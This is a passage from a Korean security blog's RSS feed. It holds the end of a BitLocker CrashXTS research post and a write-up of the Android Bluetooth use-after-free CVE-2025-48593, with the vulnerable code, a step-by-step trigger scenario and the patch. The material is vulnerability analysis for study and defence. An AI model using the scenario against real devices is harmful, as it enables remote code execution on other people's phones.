<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">4</span>e <span class="hljs-number">21</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    <span class="hljs-number">.0</span>D.........N!..<span class="hljs-number">0x00000050</span>  <span class="hljs-number">61</span> d7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">54</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    a......<span class="hljs-number">.4</span>T......<span class="hljs-number">0x00000060</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ........,.......<span class="hljs-number">0x00000070</span>  <span class="hljs-number">7</span>c <span class="hljs-number">13</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> fc <span class="hljs-number">57</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    |........W......<span class="hljs-number">0x00000080</span>  a7 bf <span class="hljs-number">12</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">82</span> <span class="hljs-number">99</span> a9 <span class="hljs-number">68</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    ...........h....</code></pre><p>exploit &#xC804;&#xD6C4;&#xC758; raw &#xC139;&#xD130;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xBA74;, exploit &#xC804;&#xC5D0;&#xB294; &#xC554;&#xD638;&#xBB38; &#xD2B9;&#xC131;&#xC0C1; &#xBB34;&#xC791;&#xC704;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xC5F4;&#xC774; &#xAD00;&#xCC30;&#xB418;&#xC9C0;&#xB9CC;, exploit &#xD6C4;&#xC5D0;&#xB294; <code>HIBR</code> &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xD558;&#xC774;&#xBC84;&#xB124;&#xC774;&#xC158; &#xD5E4;&#xB354;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xAD00;&#xCC30;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC989;, &#xD2B9;&#xC218; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB364;&#xD504;/&#xD558;&#xC774;&#xBC84;&#xB124;&#xC774;&#xC158; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC554;&#xD638;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xB178;&#xCD9C;&#xB418;&#xC5B4; &#xB098;&#xD0C0;&#xB098;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-Reliability-vs-Randomization"><a href="#2-4-Reliability-vs-Randomization" class="headerlink" title="2.4 Reliability vs. Randomization"></a>2.4 Reliability vs. Randomization</h3><p>&#xC774;&#xB7EC;&#xD55C; CrashXTS &#xAC19;&#xC740; &#xD655;&#xB960;&#xC801; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD575;&#xC2EC;&#xC740; &#xBB34;&#xACB0;&#xC131; &#xBD80;&#xC7AC;&#xB97C; &#xD1B5;&#xD55C; corrupt&#xC778;&#xB370;, &#xC774; &#xBC18;&#xC751;&#xC740; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB098; &#xBC84;&#xC804;, &#xC0C1;&#xD0DC;&#xC5D0; &#xB530;&#xB77C; &#xC27D;&#xAC8C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xD2B9;&#xC9D5; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xC81C;&#xB85C; &#xC720;&#xB3C4;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC19;&#xC740; Windows &#xBC84;&#xC804;&#xC774;&#xB77C;&#xB3C4; &#xC124;&#xCE58; &#xC774;&#xB825;, &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB0B4;&#xC5ED;, &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58;/&#xC81C;&#xAC70;&#xC5D0; &#xB530;&#xB77C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xC640; &#xD30C;&#xC77C; &#xBC30;&#xCE58;&#xAC00; &#xB2EC;&#xB77C;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4; &#xC2DC;&#xC2A4;&#xD15C;&#xB9C8;&#xB2E4; &#xCC28;&#xB4F1; &#xBD84;&#xC11D;&#xC744; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB2E4;&#xC2DC; &#xC218;&#xD589;&#xD574;&#xC57C; &#xD558;&#xBA70; &#xC774; &#xACFC;&#xC815;&#xC758; &#xC790;&#xB3D9;&#xD654;&#xAC00; &#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; BitLocker &#xC815;&#xCC45;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5B4;&#xB3C4; &#xC774;&#xBBF8; &#xC554;&#xD638;&#xD654;&#xB41C; &#xBE14;&#xB85D;&#xC740; &#xC7AC;&#xC554;&#xD638;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC6B4;&#xC601; &#xC774;&#xB825;&#xC5D0; &#xB530;&#xB77C; &#xB808;&#xC774;&#xC544;&#xC6C3; &#xC790;&#xCCB4;&#xAC00; &#xB2EC;&#xB77C;&#xC9C0;&#xBBC0;&#xB85C; &#xD55C; &#xBC88; &#xC131;&#xACF5;&#xD55C; &#xACF5;&#xACA9; &#xC704;&#xCE58;&#xAC00; &#xB2E4;&#xB978; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xC804;&#xD600; &#xC791;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. </p><h2 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a><strong>3. Conclusion</strong></h2><p><img src="/2026/01/22/banda/BitLocker_part1/ko/image16.png" alt></p><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; CrashXTS&#xB294; XTS&#xC758; &#xADFC;&#xBCF8;&#xC801; &#xD55C;&#xACC4;&#xB97C; &#xC2E4;&#xC99D;&#xD588;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC6A9;&#xC131; &#xCE21;&#xBA74;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC18C; &#xC81C;&#xD55C;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xC74C; Part&#xC5D0;&#xC11C;&#xB294; BitLocker&#xC758; &#xC774;&#xB7F0; &#xC554;&#xD638;&#xD654; &#xBAA8;&#xB4DC; &#xBE14;&#xB85D; &#xC790;&#xCCB4;&#xC758; corrupt&#xB97C; &#xC77C;&#xC73C;&#xD0A4;&#xAE30;&#xBCF4;&#xB2E4;&#xB294;, <strong>WinRE &#xAC80;&#xC99D; &#xB204;&#xB77D;, &#xBCF5;&#xAD6C; &#xACBD;&#xB85C; &#xACB0;&#xD568;, &#xD0A4; &#xAD00;&#xB9AC; &#xC2E4;&#xC218;</strong> &#xAC19;&#xC740; &#xB17C;&#xB9AC;&#xC801; &#xACB0;&#xD568;&#xC744; &#xC774;&#xC6A9;&#xD55C; exploit&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC624;&#xB298;&#xB3C4; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.&#x1F604;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf">https://dfir.ru/wp-content/uploads/2025/01/crashxts.pdf</a></li><li><a href="https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/xts/follow-up_xts_comments-ball.pdf?utm_source=chatgpt.com">https://csrc.nist.gov/csrc/media/projects/block-cipher-techniques/documents/bcm/comments/xts/follow-up_xts_comments-ball.pdf</a></li><li><a href="https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/">https://dfir.ru/2025/01/20/cve-2025-21210-aka-crashxts-a-practical-randomization-attack-against-bitlocker/</a></li><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21210">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21210</a></li><li><a href="https://www.iaesjournal.com/windows-bitlocker-bug-leaks-aes-xts-encryption/">https://www.iaesjournal.com/windows-bitlocker-bug-leaks-aes-xts-encryption/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BitLocker/">BitLocker</category>
      
      <category domain="https://hackyboiz.github.io/tags/CrashXTS/">CrashXTS</category>
      
      <category domain="https://hackyboiz.github.io/tags/AES-XTS/">AES-XTS</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/22/banda/BitLocker_part1/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-48593 : Android의 SDP DB 검증 미흡으로 발생하는 UAF로 인한 Zero-Click RCE</title>
      <link>https://hackyboiz.github.io/2026/01/21/newp1ayer48/CVE-2025-48593/</link>
      <guid>https://hackyboiz.github.io/2026/01/21/newp1ayer48/CVE-2025-48593/</guid>
      <pubDate>Wed, 21 Jan 2026 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://worthdoingbadly.com/bluetooth/&quot;&gt;https://wor</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://worthdoingbadly.com/bluetooth/">https://worthdoingbadly.com/bluetooth/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Android &#x2264; 16.0 (Builds Jul 2025 - Oct 2025)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4;&#xC5D0;&#xC11C; UAF&#xB97C; &#xD1B5;&#xD55C; Zero-Click RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBE14;&#xB8E8;&#xD22C;&#xC2A4; &#xD578;&#xC988;&#xD504;&#xB9AC; &#xD504;&#xB85C;&#xD30C;&#xC77C;(HFP) &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Service Discovery &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBE14;&#xB8E8;&#xD22C;&#xC2A4; HFP &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xB824;&#xBA74; &#xC0C1;&#xB300;&#xBC29; &#xAE30;&#xAE30;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD574; <code>tSDP_DISCOVERY_DB</code>&#xB77C;&#xB294; SDP(Service Discovery Protocol) &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tSDP_DISCOVERY_DB</span> {</span>  <span class="hljs-keyword">uint32_t</span> mem_size;                                  <span class="hljs-comment">/* Memory size of the DB        */</span>  <span class="hljs-keyword">uint32_t</span> mem_free;                                  <span class="hljs-comment">/* Memory still available       */</span>  tSDP_DISC_REC* p_first_rec;                         <span class="hljs-comment">/* Addr of first record in DB   */</span>  <span class="hljs-keyword">uint16_t</span> num_uuid_filters;                          <span class="hljs-comment">/* Number of UUIds to filter    */</span>  bluetooth::Uuid uuid_filters[SDP_MAX_UUID_FILTERS]; <span class="hljs-comment">/* UUIDs to filter */</span>  <span class="hljs-keyword">uint16_t</span> num_attr_filters;                          <span class="hljs-comment">/* Number of attribute filters  */</span>  <span class="hljs-keyword">uint16_t</span> attr_filters[SDP_MAX_ATTR_FILTERS];        <span class="hljs-comment">/* Attributes to filter */</span>  <span class="hljs-keyword">uint8_t</span>* p_free_mem;                                <span class="hljs-comment">/* Pointer to free memory       */</span>  <span class="hljs-keyword">uint8_t</span>* raw_data; <span class="hljs-comment">/* Received record from server. allocated/released by client  */</span>  <span class="hljs-keyword">uint32_t</span> raw_size; <span class="hljs-comment">/* size of raw_data */</span>  <span class="hljs-keyword">uint32_t</span> raw_used; <span class="hljs-comment">/* length of raw_data used */</span>};</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xC774;&#xC804;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>tSDP_DISCOVERY_DB</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; <code>bta_hf_client_main.cc</code>&#xC758; <code>bta_hf_client_cb_init</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bta_hf_client_cb_init</span><span class="hljs-params">(tBTA_HF_CLIENT_CB* client_cb, <span class="hljs-keyword">uint16_t</span> handle)</span> </span>{  <span class="hljs-built_in">log</span>::verbose(<span class="hljs-string">&quot;&quot;</span>);    <span class="hljs-comment">// Free any memory we need to explicity release</span>  alarm_free(client_cb-&gt;collision_timer);    <span class="hljs-comment">// release unique pointers</span>  client_cb-&gt;enabled_hf_indicators.clear();  client_cb-&gt;peer_hf_indicators.clear();  <span class="hljs-comment">// Memset the rest of the block</span>  <span class="hljs-comment">// memset(client_cb, 0, sizeof(tBTA_HF_CLIENT_CB));</span>  *client_cb = {};    <span class="hljs-comment">// Re allocate any variables required</span>  client_cb-&gt;collision_timer = alarm_new(<span class="hljs-string">&quot;bta_hf_client.scb_collision_timer&quot;</span>);  client_cb-&gt;handle = handle;  client_cb-&gt;sco_idx = BTM_INVALID_SCO_INDEX;}</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD2B9;&#xC815;&#xD55C; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; HFP &#xC5F0;&#xACB0;/&#xD574;&#xC81C;/&#xC7AC;&#xCD08;&#xAE30;&#xD654; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74;, &#xC2DC;&#xC2A4;&#xD15C;&#xC740; <code>bta_hf_client_cb_init</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xB9CC;&#xC57D; &#xC774;&#xC804; &#xC138;&#xC158;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB358; DB &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC544;&#xC9C1; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xAC70;&#xB098;, Free &#xB410;&#xC9C0;&#xB9CC; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;(Dangling Pointer)&#xB77C;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xC0C8; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xC2DD;&#xC801;&#xC778; PoC&#xB294; &#xACF5;&#xAC1C;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xB97C; &#xC7AC;&#xD604;&#xD558;&#xB294; &#xAE00;&#xC744; &#xD1B5;&#xD574; PoC &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gherkin">hf_client:                  SDP:                            tBTA_HF_CLIENT_CB           tCONN_CB 1       tCONN_CB 2     +-------------+             +------------+   +-------------+|<span class="hljs-string">             </span>|<span class="hljs-string">             </span>|<span class="hljs-string">            </span>|<span class="hljs-string">   </span>|<span class="hljs-string">             </span>||<span class="hljs-string"> ACTIVE      </span>|<span class="hljs-string">             </span>|<span class="hljs-string"> INACTIVE   </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> ACTIVE      </span>||<span class="hljs-string">             </span>|<span class="hljs-string">             </span>|<span class="hljs-string">            </span>|<span class="hljs-string">   </span>|<span class="hljs-string">             </span>||<span class="hljs-string">  p_disc_db  </span>|<span class="hljs-string">             </span>|<span class="hljs-string">   p_db     </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   p_db      </span>|+-------------+             +------------+   +----+--------+                                                  |<span class="hljs-string">         </span><span class="hljs-string">               tSDP_DISCOVERY_DB 1                </span>|<span class="hljs-string">         </span><span class="hljs-string">               +-----------+                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               +-----------+                      </span>|<span class="hljs-string">         </span><span class="hljs-string">                                                  </span>|<span class="hljs-string">         </span><span class="hljs-string">                                                  </span>|<span class="hljs-string">         </span><span class="hljs-string">                                                  </span>|<span class="hljs-string">         </span><span class="hljs-string">               (freed!)                           </span>|<span class="hljs-string">         </span><span class="hljs-string">               +-----------+                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">         </span><span class="hljs-string">               </span>|<span class="hljs-string">           +----------------------+         </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                                </span><span class="hljs-string">               </span>|<span class="hljs-string">           </span>|<span class="hljs-string">                                </span><span class="hljs-string">               +-----------+                                </span></code></pre><ol><li>&#xCCAB; &#xBC88;&#xC9F8; SDP &#xC694;&#xCCAD;&#xC5D0; &#xC624;&#xB958; &#xC751;&#xB2F5;&#xC744; &#xBCF4;&#xB0B4;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; <code>tSDP_DISCOVERY_DB</code>&#xAC00; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;(&#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; A2DP&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; &#xB610; &#xB2E4;&#xB978; SDP &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;).</li><li>&#xB450; &#xBC88;&#xC9F8; SDP &#xC694;&#xCCAD;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;. AVRCP &#xD328;&#xD0B7;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; <code>tSDP_DISCOVERY_DB</code>&#xB97C; &#xC7AC;&#xD560;&#xB2F9;&#xD558;&#xACE0;, raw_data&#xB97C; &#xB0B4; &#xB300;&#xC0C1; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC00;&#xC9DC; &#xAC1D;&#xCCB4;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB450; &#xBC88;&#xC9F8; SDP &#xC694;&#xCCAD;&#xC5D0; &#xC751;&#xB2F5;&#xD569;&#xB2C8;&#xB2E4;. <code>sdp_copy_raw_data</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; SDP &#xC751;&#xB2F5;&#xC744; &#xB300;&#xC0C1; &#xC8FC;&#xC18C;&#xB85C; <code>memcpy</code>&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>p_db</code>&#xB294; &#xCCAB; &#xBC88;&#xC9F8; SDP &#xAC80;&#xC0C9; &#xC624;&#xB958; &#xC751;&#xB2F5;&#xC5D0;&#xC11C; <code>bta_hf_client_free_db</code>&#xC5D0; &#xC758;&#xD574; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB418;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C; &#xB450; &#xBC88;&#xC9F8; SDP &#xC751;&#xB2F5;&#xC73C;&#xB85C; &#xC778;&#xD574; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2025-11-05 &#xBCF4;&#xC548; &#xD328;&#xCE58;(AOSP)&#xB85C; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bta_hf_client_cb_init</span><span class="hljs-params">(tBTA_HF_CLIENT_CB* client_cb, <span class="hljs-keyword">uint16_t</span> handle)</span> </span>{  <span class="hljs-built_in">log</span>::verbose(<span class="hljs-string">&quot;&quot;</span>);    <span class="hljs-comment">// Free any memory we need to explicity release</span>  alarm_free(client_cb-&gt;collision_timer);    <span class="hljs-comment">// release unique pointers</span>  client_cb-&gt;enabled_hf_indicators.clear();  client_cb-&gt;peer_hf_indicators.clear();+  <span class="hljs-keyword">if</span> (client_cb-&gt;p_disc_db) {+    <span class="hljs-keyword">if</span> (!get_legacy_stack_sdp_api()-&gt;service.SDP_CancelServiceSearch(client_cb-&gt;p_disc_db)) {+      <span class="hljs-built_in">log</span>::warn(<span class="hljs-string">&quot;Unable to cancel SDP service discovery peer:{}&quot;</span>, client_cb-&gt;peer_addr);+    }+    osi_free_and_reset((<span class="hljs-keyword">void</span>**)&amp;client_cb-&gt;p_disc_db);+  }+  <span class="hljs-comment">// Memset the rest of the block</span>  <span class="hljs-comment">// memset(client_cb, 0, sizeof(tBTA_HF_CLIENT_CB));</span>  *client_cb = {};    <span class="hljs-comment">// Re allocate any variables required</span>  client_cb-&gt;collision_timer = alarm_new(<span class="hljs-string">&quot;bta_hf_client.scb_collision_timer&quot;</span>);  client_cb-&gt;handle = handle;  client_cb-&gt;sco_idx = BTM_INVALID_SCO_INDEX;}</code></pre><p>&#xD328;&#xCE58;&#xB294; &#xAE30;&#xC874; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xC874;&#xC7AC; &#xC5EC;&#xBD80; &#xD655;&#xC778;&#xC744; &#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>p_disc_db</code>&#xAC00; &#xBE44;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC870;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48593">https://nvd.nist.gov/vuln/detail/CVE-2025-48593</a></li><li><a href="https://android.googlesource.com/platform/packages/modules/Bluetooth/+/c69c78d7c4f623201f35831d32e6c401156e76cc">https://android.googlesource.com/platform/packages/modules/Bluetooth/+/c69c78d7c4f623201f35831d32e6c401156e76cc</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Andriod/">Andriod</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/21/newp1ayer48/CVE-2025-48593/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 해키보이즈 막내들이 말아주는 Windows LPE 버그헌팅 체험기 Part 2 (KR)</title>
      <link>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/KR/</link>
      <guid>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/KR/</guid>
      <pubDate>Sun, 18 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2026/01/18/gongjae/WHS3-bughunting2/KR/logo_window.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerli</description>
        
      
      
      
